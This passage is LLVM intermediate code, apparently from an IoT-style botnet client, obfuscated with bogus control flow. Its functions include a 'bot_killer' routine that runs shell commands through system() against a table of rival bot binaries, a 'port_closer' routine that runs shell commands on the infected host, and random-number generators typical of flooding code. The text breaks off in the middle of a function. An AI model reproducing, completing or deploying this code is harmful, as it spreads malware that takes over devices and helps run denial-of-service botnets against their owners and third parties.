@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0
@x.99 = common global i32 0
@y.100 = common global i32 0
@x.101 = common global i32 0
@y.102 = common global i32 0
@x.103 = common global i32 0
@y.104 = common global i32 0
@x.105 = common global i32 0
@y.106 = common global i32 0
@x.107 = common global i32 0
@y.108 = common global i32 0
@x.109 = common global i32 0
@y.110 = common global i32 0
@x.111 = common global i32 0
@y.112 = common global i32 0
@x.113 = common global i32 0
@y.114 = common global i32 0
@x.115 = common global i32 0
@y.116 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = load i32, i32* @x.1
  %10 = load i32, i32* @y.2
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)

originalBBalteredBB:                              ; preds = %originalBB, %0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %1 = load i32, i32* @x.3
  %2 = load i32, i32* @y.4
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i8*, align 8
  %10 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 0) #3
  %11 = icmp ne i32 %10, -1
  %12 = load i32, i32* @x.3
  %13 = load i32, i32* @y.4
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %11, label %20, label %37

; <label>:20:                                     ; preds = %originalBBpart2
  %21 = load i32, i32* @x.3
  %22 = load i32, i32* @y.4
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %20
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8** %9, align 8
  %29 = load i32, i32* @x.3
  %30 = load i32, i32* @y.4
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %38

; <label>:37:                                     ; preds = %originalBBpart2
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8** %9, align 8
  br label %38

; <label>:38:                                     ; preds = %37, %originalBBpart24
  %39 = load i32, i32* @x.3
  %40 = load i32, i32* @y.4
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %38
  %47 = load i8*, i8** %9, align 8
  %48 = load i32, i32* @x.3
  %49 = load i32, i32* @y.4
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i8* %47

originalBBalteredBB:                              ; preds = %originalBB, %0
  %56 = alloca i8*, align 8
  %57 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 0) #3
  %58 = icmp ne i32 %57, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %20
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8** %9, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %38
  %59 = load i8*, i8** %9, align 8
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @bot_killer() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %originalBBpart213, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 184
  br i1 %4, label %5, label %53

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* @x.5
  %7 = load i32, i32* @y.6
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = load i8, i8* @buf, align 1
  %15 = sext i8 %14 to i64
  %16 = inttoptr i64 %15 to i8*
  %17 = load i32, i32* %1, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [176 x i8*], [176 x i8*]* @Bot_Killer_Binarys, i64 0, i64 %18
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* %16, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.239, i32 0, i32 0), i8* %20) #3
  %22 = load i8, i8* @buf, align 1
  %23 = sext i8 %22 to i64
  %24 = inttoptr i64 %23 to i8*
  %25 = call i32 @system(i8* %24)
  %26 = load i32, i32* @x.5
  %27 = load i32, i32* @y.6
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load i32, i32* @x.5
  %36 = load i32, i32* @y.6
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %1, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %1, align 4
  %45 = load i32, i32* @x.5
  %46 = load i32, i32* @y.6
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart213, label %originalBB1alteredBB

originalBBpart213:                                ; preds = %originalBB1
  br label %2

; <label>:53:                                     ; preds = %2
  %54 = load i32, i32* @x.5
  %55 = load i32, i32* @y.6
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %53
  %62 = load i32, i32* @x.5
  %63 = load i32, i32* @y.6
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %70 = load i8, i8* @buf, align 1
  %71 = sext i8 %70 to i64
  %72 = inttoptr i64 %71 to i8*
  %73 = load i32, i32* %1, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [176 x i8*], [176 x i8*]* @Bot_Killer_Binarys, i64 0, i64 %74
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 (i8*, i8*, ...) @sprintf(i8* %72, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.239, i32 0, i32 0), i8* %76) #3
  %78 = load i8, i8* @buf, align 1
  %79 = sext i8 %78 to i64
  %80 = inttoptr i64 %79 to i8*
  %81 = call i32 @system(i8* %80)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %82 = load i32, i32* %1, align 4
  %_ = sub i32 0, %82
  %gen = add i32 %_, 1
  %_2 = sub i32 %82, 1
  %gen3 = mul i32 %_2, 1
  %_4 = shl i32 %82, 1
  %_5 = shl i32 %82, 1
  %_6 = shl i32 %82, 1
  %_7 = sub i32 %82, 1
  %gen8 = mul i32 %_7, 1
  %_9 = shl i32 %82, 1
  %_10 = sub i32 0, %82
  %gen11 = add i32 %_10, 1
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %1, align 4
  br label %originalBB1

originalBB15alteredBB:                            ; preds = %originalBB15, %53
  br label %originalBB15
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

declare i32 @system(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @port_closer() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.240, i32 0, i32 0))
  %2 = call i32 (i8*, i8*, ...) @sprintf(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.241, i32 0, i32 0)) #3
  %3 = call i32 @system(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0))
  %4 = call i8* @strcpy(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i32 0, i32 0)) #3
  %5 = load i8, i8* @buf, align 1
  %6 = sext i8 %5 to i64
  %7 = inttoptr i64 %6 to i8*
  %8 = call i32 (i8*, i8*, ...) @sprintf(i8* %7, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i32 0, i32 0)) #3
  %9 = load i8, i8* @buf, align 1
  %10 = sext i8 %9 to i64
  %11 = inttoptr i64 %10 to i8*
  %12 = call i32 @system(i8* %11)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %63, %1
  %11 = load i32, i32* @x.9
  %12 = load i32, i32* @y.10
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %3, align 4
  %20 = icmp slt i32 %19, 4096
  %21 = load i32, i32* @x.9
  %22 = load i32, i32* @y.10
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %66

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* @x.9
  %31 = load i32, i32* @y.10
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  %38 = load i32, i32* %3, align 4
  %39 = sub nsw i32 %38, 3
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  %42 = load i32, i32* %41, align 4
  %43 = load i32, i32* %3, align 4
  %44 = sub nsw i32 %43, 2
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  %47 = load i32, i32* %46, align 4
  %48 = xor i32 %42, %47
  %49 = xor i32 %48, -1640531527
  %50 = load i32, i32* %3, align 4
  %51 = xor i32 %49, %50
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %53
  store i32 %51, i32* %54, align 4
  %55 = load i32, i32* @x.9
  %56 = load i32, i32* @y.10
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart245, label %originalBB1alteredBB

originalBBpart245:                                ; preds = %originalBB1
  br label %63

; <label>:63:                                     ; preds = %originalBBpart245
  %64 = load i32, i32* %3, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %3, align 4
  br label %10

; <label>:66:                                     ; preds = %originalBBpart2
  %67 = load i32, i32* @x.9
  %68 = load i32, i32* @y.10
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %66
  %75 = load i32, i32* @x.9
  %76 = load i32, i32* @y.10
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %83 = load i32, i32* %3, align 4
  %84 = icmp slt i32 %83, 4096
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  %85 = load i32, i32* %3, align 4
  %_ = sub i32 %85, 3
  %gen = mul i32 %_, 3
  %_2 = sub i32 %85, 3
  %gen3 = mul i32 %_2, 3
  %_4 = shl i32 %85, 3
  %_5 = shl i32 %85, 3
  %_6 = sub i32 0, %85
  %gen7 = add i32 %_6, 3
  %_8 = sub i32 0, %85
  %gen9 = add i32 %_8, 3
  %86 = sub nsw i32 %85, 3
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %87
  %89 = load i32, i32* %88, align 4
  %90 = load i32, i32* %3, align 4
  %_10 = sub i32 %90, 2
  %gen11 = mul i32 %_10, 2
  %_12 = sub i32 0, %90
  %gen13 = add i32 %_12, 2
  %_14 = shl i32 %90, 2
  %91 = sub nsw i32 %90, 2
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %92
  %94 = load i32, i32* %93, align 4
  %_15 = sub i32 0, %89
  %gen16 = add i32 %_15, %94
  %_17 = sub i32 0, %89
  %gen18 = add i32 %_17, %94
  %_19 = sub i32 %89, %94
  %gen20 = mul i32 %_19, %94
  %_21 = sub i32 0, %89
  %gen22 = add i32 %_21, %94
  %_23 = sub i32 %89, %94
  %gen24 = mul i32 %_23, %94
  %_25 = sub i32 0, %89
  %gen26 = add i32 %_25, %94
  %_27 = sub i32 %89, %94
  %gen28 = mul i32 %_27, %94
  %_29 = shl i32 %89, %94
  %95 = xor i32 %89, %94
  %_30 = sub i32 %95, -1640531527
  %gen31 = mul i32 %_30, -1640531527
  %_32 = sub i32 0, %95
  %gen33 = add i32 %_32, -1640531527
  %_34 = shl i32 %95, -1640531527
  %96 = xor i32 %95, -1640531527
  %97 = load i32, i32* %3, align 4
  %_35 = sub i32 %96, %97
  %gen36 = mul i32 %_35, %97
  %_37 = shl i32 %96, %97
  %_38 = sub i32 %96, %97
  %gen39 = mul i32 %_38, %97
  %_40 = sub i32 %96, %97
  %gen41 = mul i32 %_40, %97
  %_42 = sub i32 %96, %97
  %gen43 = mul i32 %_42, %97
  %98 = xor i32 %96, %97
  %99 = load i32, i32* %3, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %100
  store i32 %98, i32* %101, align 4
  br label %originalBB1

originalBB47alteredBB:                            ; preds = %originalBB47, %66
  br label %originalBB47
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.11
  %2 = load i32, i32* @y.12
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.11
  %38 = load i32, i32* @y.12
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %50

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* %11, align 4
  %47 = add i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @c, align 4
  %49 = add i32 %48, 1
  store i32 %49, i32* @c, align 4
  br label %50

; <label>:50:                                     ; preds = %45, %originalBBpart2
  %51 = load i32, i32* %12, align 4
  %52 = load i32, i32* %11, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %0
  %57 = alloca i64, align 8
  %58 = alloca i64, align 8
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  store i64 18782, i64* %58, align 8
  store i32 -2, i32* %60, align 4
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %_ = sub i32 0, %61
  %gen = add i32 %_, 1
  %_1 = sub i32 %61, 1
  %gen2 = mul i32 %_1, 1
  %_3 = sub i32 0, %61
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 0, %61
  %gen6 = add i32 %_5, 1
  %_7 = shl i32 %61, 1
  %_8 = sub i32 0, %61
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 %61, 1
  %gen11 = mul i32 %_10, 1
  %_12 = shl i32 %61, 1
  %62 = add i32 %61, 1
  %_13 = sub i32 0, %62
  %gen14 = add i32 %_13, 4095
  %63 = and i32 %62, 4095
  store i32 %63, i32* @rand_cmwc.i, align 4
  %64 = load i64, i64* %58, align 8
  %65 = load i32, i32* @rand_cmwc.i, align 4
  %66 = zext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = zext i32 %68 to i64
  %_15 = sub i64 %64, %69
  %gen16 = mul i64 %_15, %69
  %_17 = sub i64 0, %64
  %gen18 = add i64 %_17, %69
  %_19 = sub i64 0, %64
  %gen20 = add i64 %_19, %69
  %_21 = sub i64 0, %64
  %gen22 = add i64 %_21, %69
  %_23 = shl i64 %64, %69
  %_24 = shl i64 %64, %69
  %_25 = sub i64 %64, %69
  %gen26 = mul i64 %_25, %69
  %_27 = sub i64 %64, %69
  %gen28 = mul i64 %_27, %69
  %70 = mul i64 %64, %69
  %71 = load i32, i32* @c, align 4
  %72 = zext i32 %71 to i64
  %_29 = sub i64 0, %70
  %gen30 = add i64 %_29, %72
  %_31 = shl i64 %70, %72
  %_32 = sub i64 %70, %72
  %gen33 = mul i64 %_32, %72
  %_34 = shl i64 %70, %72
  %73 = add i64 %70, %72
  store i64 %73, i64* %57, align 8
  %74 = load i64, i64* %57, align 8
  %_35 = sub i64 %74, 32
  %gen36 = mul i64 %_35, 32
  %_37 = sub i64 %74, 32
  %gen38 = mul i64 %_37, 32
  %75 = lshr i64 %74, 32
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* @c, align 4
  %77 = load i64, i64* %57, align 8
  %78 = load i32, i32* @c, align 4
  %79 = zext i32 %78 to i64
  %_39 = sub i64 0, %77
  %gen40 = add i64 %_39, %79
  %_41 = sub i64 0, %77
  %gen42 = add i64 %_41, %79
  %_43 = shl i64 %77, %79
  %_44 = sub i64 %77, %79
  %gen45 = mul i64 %_44, %79
  %80 = add i64 %77, %79
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %59, align 4
  %82 = load i32, i32* %59, align 4
  %83 = load i32, i32* @c, align 4
  %84 = icmp ult i32 %82, %83
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = load i32, i32* @x.13
  %2 = load i32, i32* @y.14
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i64 @time(i64* null) #3
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* @x, align 4
  %11 = call i32 @getpid() #3
  %12 = call i32 @getppid() #3
  %13 = xor i32 %11, %12
  store i32 %13, i32* @y, align 4
  %14 = call i64 @clock() #3
  %15 = trunc i64 %14 to i32
  store i32 %15, i32* @z, align 4
  %16 = load i32, i32* @z, align 4
  %17 = load i32, i32* @y, align 4
  %18 = xor i32 %16, %17
  store i32 %18, i32* @w, align 4
  %19 = load i32, i32* @x.13
  %20 = load i32, i32* @y.14
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %27 = call i64 @time(i64* null) #3
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @x, align 4
  %29 = call i32 @getpid() #3
  %30 = call i32 @getppid() #3
  %_ = sub i32 %29, %30
  %gen = mul i32 %_, %30
  %31 = xor i32 %29, %30
  store i32 %31, i32* @y, align 4
  %32 = call i64 @clock() #3
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @z, align 4
  %34 = load i32, i32* @z, align 4
  %35 = load i32, i32* @y, align 4
  %_1 = shl i32 %34, %35
  %_2 = sub i32 %34, %35
  %gen3 = mul i32 %_2, %35
  %_4 = sub i32 %34, %35
  %gen5 = mul i32 %_4, %35
  %36 = xor i32 %34, %35
  store i32 %36, i32* @w, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: nounwind
declare i64 @clock() #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
